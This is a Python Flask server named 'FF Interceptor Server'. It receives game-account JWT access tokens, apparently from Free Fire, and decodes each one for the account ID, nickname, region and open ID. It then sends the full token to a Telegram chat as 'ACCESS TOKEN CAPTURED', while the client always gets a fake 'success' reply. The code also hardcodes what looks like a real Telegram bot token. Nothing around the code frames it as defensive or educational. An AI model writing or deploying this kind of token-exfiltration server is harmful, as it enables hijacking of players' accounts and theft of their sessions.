import os
import base64
import json
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# Tera Bot Token yahan ya Render environment variable mein hona chahiye
TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "8956940192:AAGu8293e28HolwGE3yFt0m-Q8xKsOg6uo4")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        payload_encoded = parts[1]
        payload_encoded += '=' * (-len(payload_encoded) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_encoded)
        return json.loads(decoded_bytes.decode('utf-8'))
    except Exception as e:
        print(f"JWT Decode Error: {e}")
        return None

@app.route('/GetLoginData', methods=['POST', 'GET'])
def get_login_data():
    try:
        auth_header = request.headers.get('Authorization') or request.args.get('auth')
        chat_id = request.args.get('chat_id')

        # Agar data POST body ya JSON mein aaya ho
        if not auth_header and request.is_json:
            req_data = request.get_json()
            auth_header = req_data.get('Authorization') or req_data.get('token')

        if auth_header:
            if auth_header.startswith("Bearer "):
                jwt_token = auth_header.split(" ")[1]
            else:
                jwt_token = auth_header

            jwt_data = decode_jwt_payload(jwt_token)
            if jwt_data:
                account_id = jwt_data.get("account_id")
                encoded_nickname = jwt_data.get("nickname")
                region = jwt_data.get("lock_region", "IND")
                open_id = jwt_data.get("external_id")
                
                try:
                    nickname = base64.b64decode(encoded_nickname).decode('utf-8') if encoded_nickname else "Unknown"
                except:
                    nickname = encoded_nickname

                if chat_id:
                    msg_text = (
                        f"🔑 *ACCESS TOKEN CAPTURED SUCCESSFULLY*!!\n\n"
                        f"👤 *ACCOUNT ID*\n`{account_id}`\n\n"
                        f"🎮 *PLAYER NAME*\n`{nickname}`\n\n"
                        f"🌍 *REGION*\n`{region}`\n\n"
                        f"🎟️ *ACCESS TOKEN*\n`{jwt_token}`\n\n"
                        f"🆔 *OPEN ID*\n`{open_id}`\n\n"
                        f"🛡️ *JWT TOKEN (VALID 8 HOURS)*\n`{jwt_token}`"
                    )
                    requests.post(TELEGRAM_API_URL, json={
                        "chat_id": chat_id,
                        "text": msg_text,
                        "parse_mode": "Markdown"
                    })

        return jsonify({"status": 0, "msg": "success"}), 200

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": 0, "msg": "success"}), 200

@app.route('/', methods=['GET'])
def home():
    return "FF Interceptor Server is Live!"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
    
